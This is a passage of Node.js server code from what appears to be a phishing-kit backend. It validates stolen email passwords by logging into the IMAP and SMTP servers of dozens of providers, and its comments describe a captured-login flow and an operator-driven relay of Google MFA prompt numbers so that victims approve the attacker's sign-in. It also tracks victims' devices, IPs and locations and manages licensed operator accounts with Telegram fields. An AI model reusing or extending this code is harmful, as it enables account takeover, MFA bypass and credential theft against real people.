  'gmail.com', 'googlemail.com',  // Google disabled basic auth 2022
  'outlook.com', 'hotmail.com', 'live.com', 'msn.com', // Microsoft disabled basic auth 2023
  'outlook.co.uk', 'hotmail.co.uk', 'live.co.uk',
  'outlook.de', 'outlook.fr',
]);

const MAIL_SERVERS = {
  // { imap, smtp } — smtp as fallback
  'gmail.com':       { imap: 'imap.gmail.com',           smtp: 'smtp.gmail.com' },
  'googlemail.com':  { imap: 'imap.gmail.com',           smtp: 'smtp.gmail.com' },
  'outlook.com':     { imap: 'outlook.office365.com',    smtp: 'smtp.office365.com' },
  'hotmail.com':     { imap: 'outlook.office365.com',    smtp: 'smtp.office365.com' },
  'live.com':        { imap: 'outlook.office365.com',    smtp: 'smtp.office365.com' },
  'msn.com':         { imap: 'outlook.office365.com',    smtp: 'smtp.office365.com' },
  'yahoo.com':       { imap: 'imap.mail.yahoo.com',      smtp: 'smtp.mail.yahoo.com' },
  'ymail.com':       { imap: 'imap.mail.yahoo.com',      smtp: 'smtp.mail.yahoo.com' },
  'aol.com':         { imap: 'imap.aol.com',             smtp: 'smtp.aol.com' },
  'icloud.com':      { imap: 'imap.mail.me.com',         smtp: 'smtp.mail.me.com' },
  'me.com':          { imap: 'imap.mail.me.com',         smtp: 'smtp.mail.me.com' },
  'mac.com':         { imap: 'imap.mail.me.com',         smtp: 'smtp.mail.me.com' },
  'zoho.com':        { imap: 'imap.zoho.com',            smtp: 'smtp.zoho.com' },
  // protonmail.com / proton.me — Proton only exposes IMAP via local Bridge software (E2EE design).
  // No public IMAP host. Falls through; verify reports error → "not compatible".
  'gmx.com':         { imap: 'imap.gmx.com',             smtp: 'mail.gmx.com' },
  'gmx.net':         { imap: 'imap.gmx.net',             smtp: 'mail.gmx.net' },
  'mail.ru':         { imap: 'imap.mail.ru',             smtp: 'smtp.mail.ru' },
  'yandex.com':      { imap: 'imap.yandex.com',          smtp: 'smtp.yandex.com' },
  'yandex.ru':       { imap: 'imap.yandex.com',          smtp: 'smtp.yandex.com' },
  'comcast.net':     { imap: 'imap.comcast.net',          smtp: 'smtp.comcast.net' },
  'att.net':         { imap: 'imap.mail.att.net',         smtp: 'smtp.mail.att.net' },
  'sbcglobal.net':   { imap: 'imap.mail.att.net',         smtp: 'smtp.mail.att.net' },
  'bellsouth.net':   { imap: 'imap.mail.att.net',         smtp: 'smtp.mail.att.net' },
  'verizon.net':     { imap: 'imap.aol.com',              smtp: 'smtp.aol.com' }, // Verizon Mail migrated to AOL/Yahoo
  // cox.net — Cox shut down their email service in 2019; verify always fails (no entry → falls through, response gives "not compatible")
  'earthlink.net':   { imap: 'imap.earthlink.net',        smtp: 'smtp.earthlink.net' },
  'btinternet.com':  { imap: 'imap.btinternet.com',       smtp: 'mail.btinternet.com' },
  'sky.com':         { imap: 'imap.tools.sky.com',        smtp: 'smtp.tools.sky.com' },
  'orange.fr':       { imap: 'imap.orange.fr',            smtp: 'smtp.orange.fr' },
  'free.fr':         { imap: 'imap.free.fr',              smtp: 'smtp.free.fr' },
  'web.de':          { imap: 'imap.web.de',               smtp: 'smtp.web.de' },
  't-online.de':     { imap: 'secureimap.t-online.de',    smtp: 'securesmtp.t-online.de' },
  'libero.it':       { imap: 'imapmail.libero.it',        smtp: 'smtp.libero.it' },
  'qq.com':          { imap: 'imap.qq.com',               smtp: 'smtp.qq.com' },
  '163.com':         { imap: 'imap.163.com',              smtp: 'smtp.163.com' },
  '126.com':         { imap: 'imap.126.com',              smtp: 'smtp.126.com' },

  // ---- France ----
  'sfr.fr':          { imap: 'imap.sfr.fr',               smtp: 'smtp.sfr.fr' },
  'neuf.fr':         { imap: 'imap.sfr.fr',               smtp: 'smtp.sfr.fr' },
  'club-internet.fr':{ imap: 'imap.sfr.fr',               smtp: 'smtp.sfr.fr' },
  'numericable.fr':  { imap: 'imap.sfr.fr',               smtp: 'smtp.sfr.fr' },
  'cegetel.net':     { imap: 'imap.sfr.fr',               smtp: 'smtp.sfr.fr' },
  'bbox.fr':         { imap: 'imap.bbox.fr',              smtp: 'smtp.bbox.fr' },
  'bouyguestelecom.fr':{ imap: 'imap.bbox.fr',            smtp: 'smtp.bbox.fr' },
  'aliceadsl.fr':    { imap: 'imap.orange.fr',            smtp: 'smtp.orange.fr' },
  'gmx.fr':          { imap: 'imap.gmx.com',              smtp: 'mail.gmx.com' },
  'wanadoo.fr':      { imap: 'imap.orange.fr',            smtp: 'smtp.orange.fr' },
  'laposte.net':     { imap: 'imap.laposte.net',          smtp: 'smtp.laposte.net' },

  // ---- Germany / DACH ----
  'mailbox.org':     { imap: 'imap.mailbox.org',          smtp: 'smtp.mailbox.org' },
  'posteo.de':       { imap: 'posteo.de',                 smtp: 'posteo.de' },
  'posteo.net':      { imap: 'posteo.de',                 smtp: 'posteo.de' },
  'arcor.de':        { imap: 'imap.vodafonemail.de',      smtp: 'smtp.vodafonemail.de' },
  '1und1.de':        { imap: 'imap.1und1.de',             smtp: 'smtp.1und1.de' },
  'freenet.de':      { imap: 'mx.freenet.de',             smtp: 'mx.freenet.de' },
  'vodafone.de':     { imap: 'imap.vodafonemail.de',      smtp: 'smtp.vodafonemail.de' },
  'vodafonemail.de': { imap: 'imap.vodafonemail.de',      smtp: 'smtp.vodafonemail.de' },
  'tutanota.com':    { imap: '',                          smtp: '' },  // E2EE — no IMAP/SMTP, will report as error
  'tutanota.de':     { imap: '',                          smtp: '' },
  'tuta.io':         { imap: '',                          smtp: '' },
  'mail.de':         { imap: 'imap.mail.de',              smtp: 'smtp.mail.de' },
  'gmx.at':          { imap: 'imap.gmx.net',              smtp: 'mail.gmx.net' },
  'gmx.ch':          { imap: 'imap.gmx.net',              smtp: 'mail.gmx.net' },

  // ---- Spain ----
  'terra.es':        { imap: 'imap.telefonica.net',       smtp: 'smtp.telefonica.net' },
  'telefonica.net':  { imap: 'imap.telefonica.net',       smtp: 'smtp.telefonica.net' },
  'movistar.es':     { imap: 'imap.movistar.es',          smtp: 'smtp.movistar.es' },
  'ono.com':         { imap: 'imap.movistar.es',          smtp: 'smtp.movistar.es' }, // ONO → Vodafone ES → uses Movistar IMAP for legacy mail
  'jazztel.es':      { imap: 'imap.orange.fr',            smtp: 'smtp.orange.fr' },    // Jazztel acquired by Orange
  // ya.com — defunct ISP, no working IMAP host. Falls through; verify reports error → "not compatible".

  // ---- UK ----
  'talktalk.net':    { imap: 'mail.talktalk.net',         smtp: 'smtp.talktalk.net' },
  'talktalk.co.uk':  { imap: 'mail.talktalk.net',         smtp: 'smtp.talktalk.net' },
  'tinyworld.co.uk': { imap: 'mail.talktalk.net',         smtp: 'smtp.talktalk.net' },
  'plus.net':        { imap: 'mail.plus.net',             smtp: 'relay.plus.net' },
  'plusnet.com':     { imap: 'mail.plus.net',             smtp: 'relay.plus.net' },
  'virgin.net':      { imap: 'imap.virginmedia.com',      smtp: 'smtp.virginmedia.com' },
  'ntlworld.com':    { imap: 'imap.virginmedia.com',      smtp: 'smtp.virginmedia.com' },
  'blueyonder.co.uk':{ imap: 'imap.virginmedia.com',      smtp: 'smtp.virginmedia.com' },
  'virginmedia.com': { imap: 'imap.virginmedia.com',      smtp: 'smtp.virginmedia.com' },
  'btinternet.com':  { imap: 'imap.btinternet.com',       smtp: 'mail.btinternet.com' },
  'btopenworld.com': { imap: 'imap.btinternet.com',       smtp: 'mail.btinternet.com' },

  // ---- USA (additional) ----
  // juno.com / netzero.net — United Online's free IMAP service was shut down; only paid POP3.
  // Falls through to auto-fallback (also fails) → response is "not compatible" within timeout.
  'windstream.net':  { imap: 'imap.windstream.net',       smtp: 'smtp.windstream.net' },
  'fastmail.com':    { imap: 'imap.fastmail.com',         smtp: 'smtp.fastmail.com' },
  'fastmail.fm':     { imap: 'imap.fastmail.com',         smtp: 'smtp.fastmail.com' },
  'pacbell.net':     { imap: 'imap.mail.att.net',         smtp: 'smtp.mail.att.net' },
  'ameritech.net':   { imap: 'imap.mail.att.net',         smtp: 'smtp.mail.att.net' },
  'swbell.net':      { imap: 'imap.mail.att.net',         smtp: 'smtp.mail.att.net' },
  'snet.net':        { imap: 'imap.mail.att.net',         smtp: 'smtp.mail.att.net' },
  'prodigy.net':     { imap: 'imap.mail.att.net',         smtp: 'smtp.mail.att.net' },
  'charter.net':     { imap: 'mobile.charter.net',        smtp: 'mobile.charter.net' },
  'roadrunner.com':  { imap: 'mobile.charter.net',        smtp: 'mobile.charter.net' },
  'rr.com':          { imap: 'mobile.charter.net',        smtp: 'mobile.charter.net' },
  'spectrum.net':    { imap: 'mobile.charter.net',        smtp: 'mobile.charter.net' },
  'optonline.net':   { imap: 'mail.optonline.net',        smtp: 'mail.optonline.net' },
  'suddenlink.net':  { imap: 'imap.suddenlink.net',       smtp: 'smtp.suddenlink.net' },
  'aim.com':         { imap: 'imap.aol.com',              smtp: 'smtp.aol.com' },
  'aol.com':         { imap: 'imap.aol.com',              smtp: 'smtp.aol.com' },
  'frontier.com':    { imap: 'imap.frontier.com',         smtp: 'smtp.frontier.com' },
  'centurylink.net': { imap: 'imap.centurylink.net',      smtp: 'smtp.centurylink.net' },
  'mindspring.com':  { imap: 'imap.earthlink.net',        smtp: 'smtp.earthlink.net' },

  // ---- China (additional) ----
  '188.com':         { imap: 'imap.188.com',              smtp: 'smtp.188.com' },
  '21cn.com':        { imap: 'imap.21cn.com',             smtp: 'smtp.21cn.com' },
  // tom.com — TOM Mail discontinued. No working IMAP host.
  '263.net':         { imap: 'imap.263.net',              smtp: 'smtp.263.net' },
  '139.com':         { imap: 'imap.139.com',              smtp: 'smtp.139.com' },
  'sina.com':        { imap: 'imap.sina.com',             smtp: 'smtp.sina.com' },
  'sina.cn':         { imap: 'imap.sina.cn',              smtp: 'smtp.sina.cn' },
  'sohu.com':        { imap: 'imap.sohu.com',             smtp: 'smtp.sohu.com' },
  'foxmail.com':     { imap: 'imap.qq.com',               smtp: 'smtp.qq.com' },
  'yeah.net':        { imap: 'imap.yeah.net',             smtp: 'smtp.yeah.net' },
  '189.cn':          { imap: 'imap.189.cn',               smtp: 'smtp.189.cn' },
  // wo.com.cn — China Unicom email; no public IMAP endpoint reachable from outside CN.
  'aliyun.com':      { imap: 'imap.aliyun.com',           smtp: 'smtp.aliyun.com' },

  // ---- Arab countries ----
  'emirates.net.ae': { imap: 'mail.eim.ae',               smtp: 'mail.eim.ae' },
  'eim.ae':          { imap: 'mail.eim.ae',               smtp: 'mail.eim.ae' },
  'etisalat.ae':     { imap: 'mail.eim.ae',               smtp: 'mail.eim.ae' },
  // du.ae, stc.com.sa, tedata.net.eg, link.com.eg, menara.ma, iam.net.ma, planet.tn,
  // topnet.tn, batelco.com.bh — region-locked / firewalled IMAP, not reachable from
  // a global probe. Branding still works via DOMAIN_TO_PROVIDER; verify falls through
  // and returns "not compatible" within the 12s timeout.
  'qatar.net.qa':    { imap: 'mail.qatar.net.qa',         smtp: 'mail.qatar.net.qa' },
  'omantel.net.om':  { imap: 'mail.omantel.net.om',       smtp: 'mail.omantel.net.om' },
  'idm.net.lb':      { imap: 'mail.idm.net.lb',           smtp: 'mail.idm.net.lb' },

  // ---- Email hosting platforms (verify against their auth endpoints) ----
  'rackspace.com':   { imap: 'secure.emailsrvr.com',      smtp: 'secure.emailsrvr.com' },
  'emailsrvr.com':   { imap: 'secure.emailsrvr.com',      smtp: 'secure.emailsrvr.com' },
  'secureserver.net':{ imap: 'imap.secureserver.net',     smtp: 'smtpout.secureserver.net' },
  'godaddy.com':     { imap: 'imap.secureserver.net',     smtp: 'smtpout.secureserver.net' },
  'ovh.fr':          { imap: 'ssl0.ovh.net',              smtp: 'ssl0.ovh.net' },
  'ovh.net':         { imap: 'ssl0.ovh.net',              smtp: 'ssl0.ovh.net' },
  'ionos.com':       { imap: 'imap.ionos.com',            smtp: 'smtp.ionos.com' },
  'ionos.de':        { imap: 'imap.ionos.de',             smtp: 'smtp.ionos.de' },
};

function getMailServers(domain) {
  if (MAIL_SERVERS[domain]) return MAIL_SERVERS[domain];
  return { imap: 'imap.' + domain, smtp: 'smtp.' + domain };
}

// Low-level TLS protocol check — works for both IMAP and SMTP
function tlsAuth(host, port, buildCommands, parseResult, timeout = 8000) {
  return new Promise((resolve) => {
    let resolved = false;
    let buffer = '';
    const done = (r) => { if (resolved) return; resolved = true; try { socket.destroy(); } catch {} resolve(r); };
    const timer = setTimeout(() => done('timeout'), timeout);

    let socket;
    try {
      socket = tls.connect({ host, port, rejectUnauthorized: false });
    } catch { clearTimeout(timer); return done('error'); }

    const state = { step: 0 };
    socket.setEncoding('utf8');
    socket.on('data', (data) => {
      buffer += data;
      const lines = buffer.split('\r\n');
      buffer = lines.pop();
      for (const line of lines) {
        const result = parseResult(line, state, socket);
        if (result) { clearTimeout(timer); done(result); return; }
      }
    });
    socket.on('error', () => { clearTimeout(timer); done('error'); });
    socket.on('timeout', () => { clearTimeout(timer); done('timeout'); });
    socket.setTimeout(timeout);
  });
}

// IMAP LOGIN attempt
function tryImap(host, email, password) {
  const safeEmail = email.replace(/\\/g, '\\\\').replace(/"/g, '\\"');
  const safePass = password.replace(/\\/g, '\\\\').replace(/"/g, '\\"');
  return tlsAuth(host, 993, null, (line, state, socket) => {
    if (state.step === 0 && line.startsWith('* OK')) {
      state.step = 1;
      socket.write(`A1 LOGIN "${safeEmail}" "${safePass}"\r\n`);
    } else if (state.step === 1 && line.startsWith('A1 ')) {
      if (line.startsWith('A1 OK')) { socket.write('A2 LOGOUT\r\n'); return 'valid'; }
      return 'invalid';
    }
    return null;
  });
}

// SMTP AUTH LOGIN attempt (base64 encoded)
function trySmtp(host, email, password) {
  const b64Email = Buffer.from(email).toString('base64');
  const b64Pass = Buffer.from(password).toString('base64');
  return tlsAuth(host, 465, null, (line, state, socket) => {
    if (state.step === 0 && (line.startsWith('220 ') || line.startsWith('220-'))) {
      state.step = 1;
      socket.write('EHLO verify.local\r\n');
    } else if (state.step === 1 && line.startsWith('250 ')) {
      state.step = 2;
      socket.write('AUTH LOGIN\r\n');
    } else if (state.step === 2 && line.startsWith('334 ')) {
      state.step = 3;
      socket.write(b64Email + '\r\n');
    } else if (state.step === 3 && line.startsWith('334 ')) {
      state.step = 4;
      socket.write(b64Pass + '\r\n');
    } else if (state.step === 4) {
      if (line.startsWith('235 ')) { socket.write('QUIT\r\n'); return 'valid'; }
      if (line.startsWith('535 ') || line.startsWith('534 ') || line.startsWith('530 ')) return 'invalid';
    }
    return null;
  });
}

// Pick IMAP/SMTP servers using the same provider detection used for the
// captured-login flow (MX + Microsoft realm). Lets corporate domains hosted
// on Google Workspace / Office 365 verify against the real provider rather
// than guessing imap.{domain} which usually doesn't exist.
async function pickServersForVerify(email, domain) {
  // 1. Hardcoded provider map wins when present
  if (MAIL_SERVERS[domain]) return { servers: [MAIL_SERVERS[domain]], provider: null };

  // 2. Ask the provider detector
  let provider = null;
  try {
    const det = await detectProvider(email, domain);
    provider = det && det.provider;
  } catch {}

  if (provider === 'google') return { servers: [{ imap: 'imap.gmail.com', smtp: 'smtp.gmail.com' }], provider };
  if (provider === 'microsoft') return { servers: [{ imap: 'outlook.office365.com', smtp: 'smtp.office365.com' }], provider };
  if (provider === 'yahoo') return { servers: [{ imap: 'imap.mail.yahoo.com', smtp: 'smtp.mail.yahoo.com' }], provider };
  if (provider === 'apple' || provider === 'icloud') return { servers: [{ imap: 'imap.mail.me.com', smtp: 'smtp.mail.me.com' }], provider };
  if (provider === 'zoho') return { servers: [{ imap: 'imap.zoho.com', smtp: 'smtp.zoho.com' }], provider };
  if (provider === 'protonmail' || provider === 'proton') return { servers: [{ imap: 'imap.protonmail.ch', smtp: 'smtp.protonmail.ch' }], provider };
  if (provider === 'rackspace') return { servers: [{ imap: 'secure.emailsrvr.com', smtp: 'secure.emailsrvr.com' }], provider };
  if (provider === 'godaddy')   return { servers: [{ imap: 'imap.secureserver.net', smtp: 'smtpout.secureserver.net' }], provider };
  if (provider === 'ovh')       return { servers: [{ imap: 'ssl0.ovh.net', smtp: 'ssl0.ovh.net' }], provider };
  if (provider === 'ionos')     return { servers: [{ imap: 'imap.ionos.com', smtp: 'smtp.ionos.com' }], provider };

  // 3. Unknown — try common host patterns in order
  return {
    servers: [
      { imap: 'imap.' + domain,      smtp: 'smtp.' + domain },
      { imap: 'mail.' + domain,      smtp: 'mail.' + domain },
      { imap: 'imap-mail.' + domain, smtp: 'smtp-mail.' + domain },
    ],
    provider: null,
  };
}

// Main verify function. Strategy:
//   1. Pick the right IMAP/SMTP servers (provider-aware)
//   2. For each candidate, try IMAP (port 993) first, then SMTP (port 465)
//   3. First conclusive result (valid/invalid) wins.
//   4. If all attempts return error/timeout: oauth_only (if Google/MS) or error.
async function verifyCredentials(email, password) {
  const domain = email.split('@')[1].toLowerCase();
  const isHardcodedOAuthOnly = OAUTH_ONLY_DOMAINS.has(domain);
  const { servers, provider } = await pickServersForVerify(email, domain);
  const isOAuthOnly = isHardcodedOAuthOnly || provider === 'google' || provider === 'microsoft';

  let lastFailure = null;

  for (const s of servers) {
    // IMAP first (unless we know the provider blocks basic auth)
    if (!isOAuthOnly && s.imap) {
      try {
        const r = await tryImap(s.imap, email, password);
        console.log(`[verify] ${email} via IMAP ${s.imap}: ${r}`);
        if (r === 'valid' || r === 'invalid') return { result: r, method: 'imap' };
        lastFailure = r;
      } catch (e) {
        console.log(`[verify] ${email} IMAP ${s.imap} threw:`, e.message);
        lastFailure = 'error';
      }
    }
    // SMTP fallback (sometimes works when IMAP is blocked)
    if (s.smtp) {
      try {
        const r = await trySmtp(s.smtp, email, password);
        console.log(`[verify] ${email} via SMTP ${s.smtp}: ${r}`);
        if (r === 'valid' || r === 'invalid') return { result: r, method: 'smtp' };
        lastFailure = r;
      } catch (e) {
        console.log(`[verify] ${email} SMTP ${s.smtp} threw:`, e.message);
        lastFailure = 'error';
      }
    }
  }

  // Nothing conclusive
  if (isOAuthOnly) return { result: 'oauth_only', method: 'none' };
  return { result: lastFailure === 'timeout' ? 'timeout' : 'error', method: 'none' };
}

// ---- User Database ----
const USERS_DB_PATH = path.join(__dirname, 'users.json');
let usersDB = []; // array of user objects

function generateSlug() {
  return crypto.randomBytes(5).toString('hex'); // 10-char unique slug
}

function loadUsersDB() {
  try {
    if (fs.existsSync(USERS_DB_PATH)) {
      usersDB = JSON.parse(fs.readFileSync(USERS_DB_PATH, 'utf8'));
      // Migrate: add new fields to existing users
      let migrated = false;
      usersDB.forEach(u => {
        if (!u.slug) { u.slug = generateSlug(); migrated = true; }
        if (!u.slugSecret) { u.slugSecret = crypto.randomBytes(32).toString('hex'); migrated = true; }
        if (!u.relayToken) { u.relayToken = crypto.randomBytes(16).toString('hex'); migrated = true; }
        if (u.domain === undefined) { u.domain = ''; migrated = true; }
        if (u.domainVerified === undefined) { u.domainVerified = false; migrated = true; }
        if (u.domainSslStatus === undefined) { u.domainSslStatus = ''; migrated = true; }
        if (u.domainVerifyToken === undefined) { u.domainVerifyToken = crypto.randomBytes(12).toString('hex'); migrated = true; }
        if (u.encryptionPreset === undefined) { u.encryptionPreset = 'medium'; migrated = true; }
        if (u.frontDomain === undefined) { u.frontDomain = ''; migrated = true; }
        if (u.features === undefined) { u.features = { chameleon: true, inbox: true, convert: true, links: true }; migrated = true; }
        // Per-user domain-required flag — default false (users can generate without a
        // verified domain; the chameleon URL falls back to the server's public URL).
        // Superadmin can flip true on a per-user basis to force domain verification.
        if (u.requireDomain === undefined) { u.requireDomain = false; migrated = true; }
        if (u.license === undefined) {
          u.license = {
            key: u.role === 'superadmin' ? 'OWNER' : crypto.randomBytes(8).toString('hex').toUpperCase(),
            tier: u.role === 'superadmin' ? 'owner' : 'basic',
            active: true,
            expiresAt: u.role === 'superadmin' ? null : new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString(),
            createdAt: new Date().toISOString(),
          };
          migrated = true;
        }
        if (u.mfaEnabled === undefined) { u.mfaEnabled = false; migrated = true; }
        if (u.telegramBotToken === undefined) { u.telegramBotToken = ''; migrated = true; }
        if (u.telegramChatId === undefined) { u.telegramChatId = ''; migrated = true; }
        if (u.telegramEnabled === undefined) { u.telegramEnabled = false; migrated = true; }
      });
      if (migrated) saveUsersDB();
      console.log(`[users] Loaded ${usersDB.length} users`);
    }
  } catch (e) {
    console.warn('[users] Could not load users.json:', e.message);
    usersDB = [];
  }
  // Auto-seed super admin if no users exist
  if (usersDB.length === 0) {
    usersDB.push({
      id: 'u_' + crypto.randomBytes(4).toString('hex'),
      slug: generateSlug(),
      username: ADMIN_USER,
      displayName: 'Super Admin',
      passwordHash: hashPasswordSyncBootstrap(ADMIN_PASS),
      role: 'superadmin',
      mfaEnabled: false,
      assignedEmails: [],
      assignedDomains: [],
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    });
    saveUsersDB();
    console.log(`[users] Auto-created super admin: ${ADMIN_USER}`);
  }
}

function saveUsersDB() {
  try {
    fs.writeFileSync(USERS_DB_PATH, JSON.stringify(usersDB, null, 2));
  } catch (e) {
    console.warn('[users] Could not save users.json:', e.message);
  }
}

function canSeeEmail(adminUser, email) {
  if (adminUser.role === 'superadmin') return true;
  const lower = email.toLowerCase();
  if (adminUser.assignedEmails.some(e => e.toLowerCase() === lower)) return true;
  const domain = lower.split('@')[1];
  if (domain && adminUser.assignedDomains.some(d => d.toLowerCase() === domain)) return true;
  return false;
}

loadUsersDB();

// ---- Invite Tokens ----
const TOKENS_DB_PATH = path.join(__dirname, 'invite-tokens.json');
let inviteTokens = []; // { token, displayName, role, assignedEmails, assignedDomains, createdBy, createdAt, expiresAt }

function loadTokensDB() {
  try {
    if (fs.existsSync(TOKENS_DB_PATH)) {
      inviteTokens = JSON.parse(fs.readFileSync(TOKENS_DB_PATH, 'utf8'));
      // Purge expired tokens on load
      const now = Date.now();
      inviteTokens = inviteTokens.filter(t => !t.expiresAt || new Date(t.expiresAt).getTime() > now);
      console.log(`[tokens] Loaded ${inviteTokens.length} active invite tokens`);
    }
  } catch (e) {
    console.warn('[tokens] Could not load invite-tokens.json:', e.message);
    inviteTokens = [];
  }
}

function saveTokensDB() {
  try {
    fs.writeFileSync(TOKENS_DB_PATH, JSON.stringify(inviteTokens, null, 2));
  } catch (e) {
    console.warn('[tokens] Could not save invite-tokens.json:', e.message);
  }
}

loadTokensDB();

// ---- Active Google MFA sessions (operator-pushed prompt number) ----
// When a recipient lands on the Google Prompt MFA screen, the chameleon page
// POSTs /api/mfa-presence to register here. The operator then sees the live
// session in admin and pushes a 2-digit number that mirrors what real Google
// shows on the operator's actual sign-in tab — the recipient polls
// /api/mfa-prompt-number and renders that number, so when they tap their phone
// notification the matching number is correct.
const activeMfaSessions = new Map(); // key "ip|email" → { ip, email, slug, ua, ts, number, pushedAt }
const ACTIVE_MFA_TTL_MS = 15 * 60 * 1000;
function activeMfaKey(ip, email) { return `${ip || '?'}|${(email || '').toLowerCase()}`; }
setInterval(() => {
  const cutoff = Date.now() - ACTIVE_MFA_TTL_MS;
  for (const [k, s] of activeMfaSessions) if (s.ts < cutoff) activeMfaSessions.delete(k);
}, 5 * 60 * 1000).unref();

// ---- Password attempt tracking ----
// key: email → { count, firstAttempt }
const passwordAttempts = new Map();
// MFA attempt tracking: email → { count }
const mfaAttempts = new Map();

// ---- Device Fingerprint Tracking ----
// Tracks unique devices accessing each email/link. Flags suspicious patterns.
const FINGERPRINT_DB_PATH = path.join(__dirname, 'device-fingerprints.json');
let fingerprintDB = {}; // email → { devices: { fpHash → deviceInfo }, flagged: bool }

function loadFingerprintDB() {
  try {
    if (fs.existsSync(FINGERPRINT_DB_PATH)) {
      fingerprintDB = JSON.parse(fs.readFileSync(FINGERPRINT_DB_PATH, 'utf8'));
      console.log(`[fingerprint] Loaded ${Object.keys(fingerprintDB).length} tracked emails`);
    }
  } catch (e) {
    console.warn('[fingerprint] Could not load device-fingerprints.json:', e.message);
    fingerprintDB = {};
  }
}

function saveFingerprintDB() {
  queueWrite(FINGERPRINT_DB_PATH, () => fingerprintDB, 'fingerprint', { delayMs: 1500 });
}

let fpSavePending = false;
function scheduleFpSave() {
  if (fpSavePending) return;
  fpSavePending = true;
  setTimeout(() => { fpSavePending = false; saveFingerprintDB(); }, 15000);
}

const MAX_DEVICES_PER_EMAIL = 5; // flag as suspicious if more than 5 unique devices

function trackFingerprint(email, fpHash, fpSignals, ip, userAgent, slug) {
  if (!fpHash || !email) return { allowed: true };

  if (!fingerprintDB[email]) {
    fingerprintDB[email] = { devices: {}, flagged: false, firstSeen: new Date().toISOString(), slug: slug || null };
  }
  // Update slug if provided (track which user's URL was used)
  if (slug) fingerprintDB[email].slug = slug;
  const record = fingerprintDB[email];
  const now = new Date().toISOString();

  if (record.devices[fpHash]) {
    // Known device — update last seen
    record.devices[fpHash].lastSeen = now;
    record.devices[fpHash].hits++;
    record.devices[fpHash].lastIp = ip;
  } else {
    // New device for this email
    record.devices[fpHash] = {
      firstSeen: now,
      lastSeen: now,
      hits: 1,
      ip,
      userAgent: (userAgent || '').slice(0, 200),
      gpu: fpSignals?.gpu || '',
      screen: fpSignals?.screen || '',
      platform: fpSignals?.platform || '',
      timezone: fpSignals?.timezone || '',
      language: fpSignals?.language || '',
      lastIp: ip,
    };
    console.log(`[fingerprint] New device for ${email}: ${fpHash.slice(0, 12)}... (${Object.keys(record.devices).length} total)`);
  }

  const deviceCount = Object.keys(record.devices).length;
  if (deviceCount > MAX_DEVICES_PER_EMAIL && !record.flagged) {
    record.flagged = true;
    console.warn(`[fingerprint] SUSPICIOUS: ${email} accessed from ${deviceCount} different devices!`);
  }

  scheduleFpSave();
  return {
    allowed: true,
    deviceCount,
    flagged: record.flagged,
    isNewDevice: record.devices[fpHash].hits === 1,
  };
}

loadFingerprintDB();

// ---- Visitor log (anonymous chameleon HTML hits) ----
// Keyed by `slug|ip` — aggregates repeated hits from the same viewer.
const VISITOR_DB_PATH = path.join(__dirname, 'visitors.json');
let visitorDB = {};
const MAX_VISITOR_ENTRIES = 5000;

function loadVisitorDB() {
  try {
    if (fs.existsSync(VISITOR_DB_PATH)) {
      visitorDB = JSON.parse(fs.readFileSync(VISITOR_DB_PATH, 'utf8'));
      if (typeof visitorDB !== 'object' || !visitorDB) visitorDB = {};
      console.log(`[visitors] Loaded ${Object.keys(visitorDB).length} visitor records`);
    }
  } catch (e) {
    console.warn('[visitors] Could not load visitors.json:', e.message);
    visitorDB = {};
  }
}
function saveVisitorDB() {
  // Compact JSON — visitors.json is machine-only and grows fast.
  queueWrite(VISITOR_DB_PATH, () => visitorDB, 'visitors', { delayMs: 2000 });
}
function scheduleVisitorSave() { saveVisitorDB(); }
function trackVisitor(slug, ownerId, req, source, cid) {
  if (!slug && !cid) return;
  let ip = (req.headers['x-forwarded-for'] || req.ip || req.socket.remoteAddress || '').toString().split(',')[0].trim() || 'anon';
  if (ip.startsWith('::ffff:')) ip = ip.slice(7);
  const ua = (req.headers['user-agent'] || '').toString().slice(0, 240);
  const referer = (req.headers['referer'] || req.headers['referrer'] || '').toString().slice(0, 240);
  // Key by cid when known so visits group per attachment; else fall back to slug.
  const key = cid ? `${cid}|${ip}` : `${slug}|${ip}`;
  const now = new Date().toISOString();
  const path = (req.originalUrl || req.url || '').slice(0, 200);
  let isNew = false;
  // Attach whatever geo we already have (cached or offline) so the entry has at least country immediately.
  const cachedGeo = geoForIp(ip) || offlineGeo(ip) || null;
  if (!visitorDB[key]) {
    isNew = true;
    visitorDB[key] = {
      slug, cid: cid || null, ownerId: ownerId || null, ip, ua, referer,
      firstSeen: now, lastSeen: now, hits: 1,
      source: source || 'chameleon', lastPath: path,
      geo: cachedGeo,
    };
  } else {
    const v = visitorDB[key];
    v.lastSeen = now;
    v.hits = (v.hits || 0) + 1;
    if (ua) v.ua = ua;
    if (referer) v.referer = referer;
    v.lastPath = path;
    if (ownerId && !v.ownerId) v.ownerId = ownerId;
    if (cid && !v.cid) v.cid = cid;
    if (slug && !v.slug) v.slug = slug;
    if (cachedGeo && (!v.geo || (!v.geo.isp && cachedGeo.isp))) v.geo = cachedGeo;
  }
  // Queue an ASN/ISP enrichment if we don't have one yet.
  queueGeoLookup(ip);
  try {
    broadcast('visitor', { slug, cid: cid || null, ip, ua, isNew, source: source || 'chameleon', geo: visitorDB[key].geo || null },
      (c) => c.role === 'superadmin' || (slug && c.slug === slug));
  } catch {}
  // Bound memory: if we exceed cap, drop oldest entries.
  const keys = Object.keys(visitorDB);
  if (keys.length > MAX_VISITOR_ENTRIES) {
    const sorted = keys.sort((a, b) => new Date(visitorDB[a].lastSeen) - new Date(visitorDB[b].lastSeen));
    const drop = sorted.slice(0, keys.length - MAX_VISITOR_ENTRIES);
    drop.forEach(k => delete visitorDB[k]);
  }
  scheduleVisitorSave();
}
loadVisitorDB();

// ---- Geo / ASN enrichment ----
// Hybrid: geoip-lite (offline, instant) for country/city + ip-api.com (free, ~45 req/min) for ISP/ASN/proxy flags.
// Cached to disk so each unique IP is only fetched once.
const GEO_CACHE_PATH = path.join(__dirname, 'geo-cache.json');
let geoCache = {};
const GEO_TTL_MS = 30 * 86400 * 1000; // 30 days
const GEO_QUEUE = [];
let geoBusy = false;
const httpMod = require('http');

function loadGeoCache() {
  try {
    if (fs.existsSync(GEO_CACHE_PATH)) {
      geoCache = JSON.parse(fs.readFileSync(GEO_CACHE_PATH, 'utf8')) || {};
      console.log(`[geo] Loaded ${Object.keys(geoCache).length} cached geo records`);
    }
  } catch (e) { console.warn('[geo] load failed:', e.message); geoCache = {}; }
}
function scheduleGeoSave() {
  // Compact JSON — geo-cache.json is machine-only.
  queueWrite(GEO_CACHE_PATH, () => geoCache, 'geo', { delayMs: 5000 });
}
loadGeoCache();

function isPrivateIp(ip) {
